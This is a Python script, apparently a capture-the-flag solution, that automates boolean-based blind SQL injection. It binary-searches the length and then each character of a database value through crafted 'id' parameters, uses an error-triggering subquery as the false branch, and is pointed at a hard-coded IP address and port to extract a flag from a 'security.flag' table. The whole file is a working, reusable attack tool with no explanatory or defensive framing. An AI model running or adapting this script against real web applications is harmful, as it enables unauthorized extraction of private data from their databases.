import requests


def guess_number(url, num_guess_payload, find_in_text):
    start = 0
    end = 100
    while 1:
        payload = '''?id=1 and if(({})>{},1,(select 1 union select 2))#'''\
                            .format(num_guess_payload, (start + end) // 2)
        (start, end) = change_start_end(url + payload, find_in_text, start, end)
        if start == end:
            print("number={}".format(start))
            break
    return start


def guess_name(url, num_guess_payload, name_guess_payload, find_in_text):
    length = guess_number(url, num_guess_payload, find_in_text)
    s = ""
    for i in range(length):
        start = 32
        end = 126
        while 1:
            payload = '''?id=1 and if(ascii(substr(({}),{},1))>{},1,(select 1 union select 2))#'''\
                                .format(name_guess_payload, i + 1, (start + end) // 2)
            (start, end) = change_start_end(url + payload, find_in_text, start, end)
            if start == end:
                s += chr(start)
                break
        print(s)


def change_start_end(url_payload, find_in_text, start, end):
    r = requests.get(url_payload)
    if find_in_text not in r.text:
        end = (start + end) // 2
    else:
        start = (start + end) // 2 + 1
    return start, end


if __name__ == "__main__":
    Url = "http://111.229.209.37:20023/"
    Find_in_text = "ok"
    num_gp = '''(select length(flag) from security.flag)'''
    name_gp = '''(select flag from security.flag)'''
    guess_name(Url, num_gp, name_gp, Find_in_text)
